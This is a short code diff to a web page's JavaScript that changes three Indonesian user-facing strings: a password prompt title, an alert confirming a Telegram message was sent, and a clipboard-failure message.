@@ -114,7 +114,7 @@
         }
 
         usePasswordButton.addEventListener('click', () => {
-            document.querySelector('.title').textContent = 'Masukkan Sandi (Nama)';
+            document.querySelector('.title').textContent = 'Masukkan Password';
             document.querySelector('.pin-dots').style.display = 'none';
             document.querySelector('.keyboard').style.display = 'none';
             contactUsButton.style.display = 'none';
@@ -181,7 +181,7 @@
                 .then(data => {
                     hideLoading();
                     console.log('Pesan Telegram Terkirim:', data);
-                    alert('Pesan Anda telah terkirim ke Telegram.');
+                    alert('KAMU BERHASIL DAFTAR KE NARA ZAEN');
                     contactUsContainer.style.display = 'none';
                     passwordDisplayContainer.style.display = 'flex';
                     contactNameDisplay.textContent = submittedName;
@@ -209,7 +209,7 @@
                             alert('Gagal menyalin sandi.');
                         });
                 } else {
-                    alert('Izin untuk menyalin ke clipboard ditolak. Silakan periksa pengaturan browser Anda.');
+                    alert('TIDAK BERHASIL MENYALIN, MOHON SALIN MANUAL YA KALIMAT YANG BERWARNA HIJAU');
                 }
             });
         });
